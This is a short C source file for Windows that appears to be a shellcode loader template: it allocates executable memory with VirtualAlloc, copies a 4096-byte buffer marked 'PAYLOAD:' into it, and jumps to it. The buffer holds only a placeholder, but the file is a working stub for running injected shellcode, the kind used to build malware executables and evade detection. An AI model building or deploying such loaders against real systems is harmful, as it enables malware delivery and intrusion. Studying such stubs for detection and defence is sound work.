#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#undef WIN32_LEAN_AND_MEAN

#define SCSIZE 4096
char payload[SCSIZE] = "PAYLOAD:";

int main(int argc, char** argv) {
	void* exec = VirtualAlloc(0, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	for (int i = 0; i < SCSIZE; i++) {
		((char*) exec)[i] = payload[i];
	}

	((void(*)())exec)();

	ExitProcess(0);

	return 0;
}
